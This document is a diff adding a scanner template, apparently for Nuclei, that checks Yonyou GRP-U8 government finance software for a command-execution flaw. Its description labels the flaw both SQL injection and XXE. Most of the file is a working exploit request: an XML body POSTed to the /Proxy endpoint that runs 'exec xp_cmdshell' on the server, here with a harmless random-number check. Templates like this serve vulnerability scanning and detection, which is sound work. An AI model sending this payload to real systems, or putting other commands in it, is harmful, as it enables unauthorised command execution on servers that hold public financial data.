@@ -1,0 +1,30 @@
+id: Yonyou-GRP_U8-SqliToRce
+info:
+  name: 用友GRP-U8SQL注入&远程代码执行漏洞
+  author:
+  - l0ne1y
+  description: |-
+    用友GRP-U8SQL注入&远程代码执行漏洞
+    用友GRP-U8行政事业财务管理软件是用友公司专注于国家电子政务事业，基于云计算技术所推出的新一代产品，是我国行政事业财务领域最专业的政府财务管理软件。用友GRP-u8被曝存在XXE漏洞，该漏洞源于应用程序解析XML输入时没有限制外部实体的加载，导致可加载恶意外部文件，可以执行SQL语句，甚至可以执行系统命令。
+  severity: high
+  remediation: |-
+    #### 官方修复方案：
+    升级系统至无漏洞版本，或于官网下载安全补丁。
+requests:
+- matchers:
+  - type: word
+    condition: and
+    words:
+    - '{{randomValue}}'
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/Proxy'
+  method: POST
+  body: cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA
+    format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA
+    format="text">exec xp_cmdshell "set/A {{randomValue}}"</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
+variables:
+  randomValue: '{{rand_int(200000000, 210000000)}}'
